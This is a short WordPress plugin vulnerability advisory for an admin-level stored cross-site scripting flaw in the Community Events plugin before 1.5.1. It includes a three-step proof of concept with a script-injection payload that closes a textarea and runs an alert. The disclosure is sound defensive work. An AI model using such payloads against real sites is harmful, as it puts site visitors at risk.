## WordPress Plugin Vulnerabilities

# Community Events < 1.5.1 - Admin+ Stored XSS

### Description

The plugin does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered\_html capability is disallowed (for example in multisite setup)

### Proof of Concept

1. Go to https://example.com/wp-admin/admin.php?page=community-events-stylesheet
2. Add the payload: `</textarea><script>alert(1)</script>`
3. Save and see the XSS

### Affects Plugins
